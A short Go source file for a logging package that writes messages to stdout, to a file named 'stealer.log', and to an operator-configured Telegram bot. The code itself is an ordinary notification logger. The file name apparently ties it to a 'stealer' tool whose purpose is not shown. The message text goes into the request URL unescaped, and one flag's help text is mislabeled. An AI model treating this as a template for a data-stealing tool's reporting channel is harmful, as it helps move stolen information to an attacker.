// Package log writes logging messages to stdout, file and telegram
package log

import (
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"

	log "github.com/sirupsen/logrus"
)

var (
	logger *log.Logger
	apiKey *string
	chatId *string
)

func init() {
	// Initialize logger
	logger = log.New()

	// Default configuration
	timestampFormat := "02-01-2006 15:04:05"
	logger.Formatter = &log.TextFormatter{
		TimestampFormat: timestampFormat,
		FullTimestamp:   true,
	}
	if f, err := os.OpenFile("./stealer.log", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0666); err == nil {
		logger.Out = io.MultiWriter(f, os.Stdout)
	} else {
		fmt.Print("Failed to open log file: you can miss important log")
		logger.Out = os.Stdout
	}
	logger.SetLevel(log.InfoLevel)

	apiKey = flag.String("telegram-apikey", "", "Telegram API key")
	chatId = flag.String("telegram-chatid", "", "Telegram API key")
}

func sendTelegramMsg(msg string) {
	if *apiKey == "" || *chatId == "" {
		return
	}
	url := "https://api.telegram.org/bot" + *apiKey + "/sendMessage?chat_id=" + *chatId + "&text=" + msg
	http.Get(url)
}

// Info level logging
func Info(args ...interface{}) {
	logger.Info(args...)
	go sendTelegramMsg(fmt.Sprint(args...))
}

// Infof info-level logging with format
func Infof(format string, args ...interface{}) {
	logger.Infof(format, args...)
	go sendTelegramMsg(fmt.Sprintf(format, args...))
}
